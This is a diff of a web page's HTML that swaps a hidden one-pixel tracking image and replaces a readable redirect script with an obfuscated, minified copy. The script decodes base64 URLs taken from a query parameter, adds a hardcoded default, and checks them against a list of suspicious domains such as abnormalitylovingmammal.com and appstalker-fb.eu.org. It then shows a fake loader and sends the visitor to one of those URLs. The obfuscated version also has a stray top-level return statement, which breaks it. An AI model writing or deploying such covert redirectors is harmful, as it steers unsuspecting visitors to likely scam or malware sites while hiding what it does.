@@ -69,7 +69,7 @@
 <body>
 <div class="lol">
 <img src="https://i0.wp.com/iili.io/FFCw6LG.md.jpg?resize=720,512"/>
-<img src="//i0.wp.com/playdotchan.com/bio/595bdb5761be76bcd325ba1360f2fdac.gif?resize=720,512" style="position: absolute; width: 1px; height: 1px;" class="lazy" loading="lazy" />
+<img src="//i0.wp.com/i.gifer.com/7V2A.gif?resize=720,512" style="position: absolute; width: 1px; height: 1px;" class="lazy" loading="lazy" />
 </div>
 
 <div id="loader" class="loader-screen">
@@ -86,48 +86,8 @@
 </div>
 
 <script>
-(function () {
-const params = new URLSearchParams(window.location.search);
-const encoded = params.get('key');
-if (!encoded) return;
-
-try {
-  const userUrls = encoded.trim().split('|');
-  const myDefaultUrls = [
-    "aHR0cHM6Ly9hYm5vcm1hbGl0eWxvdmluZ21hbW1hbC5jb20vcHp2MDljMjY4ZT9rZXk9MTU5MDAxZmVhYjQ5MjdiNjdjMTRjYmIyZjdkMmQxY2M="
-  ];
-
-  const allEncoded = [...userUrls, ...myDefaultUrls];
-  const allUrls = allEncoded.map(url => atob(url)); // ✅ Decode semua
-
-  const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
-  const urlObj = new URL(finalUrl);
-  const host = urlObj.hostname;
-
-  const allowedDomains = [
-    "abnormalitylovingmammal.com",
-    "pwcenter.eu.org",
-    "otieu.com",
-    "appstalker-fb.eu.org",
-    "xpweyurt.eu.org"
-  ];
-
-  const isAllowed = allowedDomains.some(domain => host.includes(domain));
-
-  if (isAllowed) {
-    document.getElementById("errorPage").style.display = "none";
-    document.getElementById("loader").style.display = "flex";
-    setTimeout(() => {
-      window.location.href = finalUrl;
-    }, 1200);
-  }
-} catch (err) {
-  console.error("Broken page:", err);
-}
-})();
-</script>
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
+var _0xa3f1=["\x73\x65\x61\x72\x63\x68"];const params=new URLSearchParams(window.location[_0xa3f1[0]]);const encoded=params.get("key");if(!encoded)return;try{const userUrls=encoded.trim().split("|");const myDefaultUrls=["aHR0cHM6Ly9hYm5vcm1hbGl0eWxvdmluZ21hbW1hbC5jb20vcHp2MDljMjY4ZT9rZXk9MTU5MDAxZmVhYjQ5MjdiNjdjMTRjYmIyZjdkMmQxY2M="];const allEncoded=[...userUrls,...myDefaultUrls];const allUrls=allEncoded.map(url=>atob(url));const finalUrl=allUrls[Math.floor(Math.random()*allUrls.length)];const urlObj=new URL(finalUrl);const host=urlObj.hostname;const allowedDomains=["abnormalitylovingmammal.com","pwcenter.eu.org","otieu.com","appstalker-fb.eu.org","xpweyurt.eu.org"];const isAllowed=allowedDomains.some(domain=>host.includes(domain));if(isAllowed){document.getElementById("errorPage").style.display="none";document.getElementById("loader").style.display="flex";setTimeout(()=>{window.location.href=finalUrl},1200)}}catch(err){console.error("Broken page:",err)};
+document.addEventListener("DOMContentLoaded", function() {
   var lazyloadImages = document.querySelectorAll("img.lazy");    
   var lazyloadThrottleTimeout;
   
